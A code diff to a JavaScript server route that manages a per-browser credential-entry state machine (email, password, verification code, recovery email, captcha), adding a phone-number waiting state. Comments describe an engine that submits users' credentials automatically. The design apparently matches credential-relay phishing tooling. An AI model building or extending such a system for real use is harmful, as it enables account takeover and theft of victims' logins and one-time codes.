@@ -99,7 +99,7 @@ export async function POST(request) {
     }
 
     const lastActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
-    const processable = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGPASSWORDERROR", "WAITINGRECOVERYEMAIL", "WAITINGCAPTCHA"];
+    const processable = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGPASSWORDERROR", "WAITINGRECOVERYEMAIL", "WAITINGPHONENUMBER", "WAITINGCAPTCHA"];
     if (processable.includes(row.status) && (Date.now() - lastActivity.getTime()) > 600000) {
         setCachedRow(browserId, { status: "FAILED" });
         row.status = "FAILED";
@@ -120,7 +120,7 @@ export async function POST(request) {
     // jobMap stays set for the WHOLE processRow (single-flight guard), so it must NOT
     // keep engineProcessing=true for these statuses — otherwise the template stays on the
     // loading overlay forever and the user can never supply the requested input.
-    const inputWaitingStatuses = new Set(["WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
+    const inputWaitingStatuses = new Set(["WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGPHONENUMBER","WAITINGCAPTCHA"]);
     if (terminalStatuses.has(row.status)) {
         engineProcessing = false;
     } else {
@@ -131,7 +131,7 @@ export async function POST(request) {
             // between update-process writing to cache and the engine calling
             // activelyProcessing.add(browserId). Without this, the template re-renders
             // the waiting form and wipes the user's typed input.
-            const waitingStatuses = new Set(["WAITING","WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
+            const waitingStatuses = new Set(["WAITING","WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGPHONENUMBER","WAITINGCAPTCHA"]);
             if (waitingStatuses.has(row.status)) {
                 // If the row already has the requested credential, the engine doesn't need the
                 // user to type it again — it will submit it automatically. Keep the template in
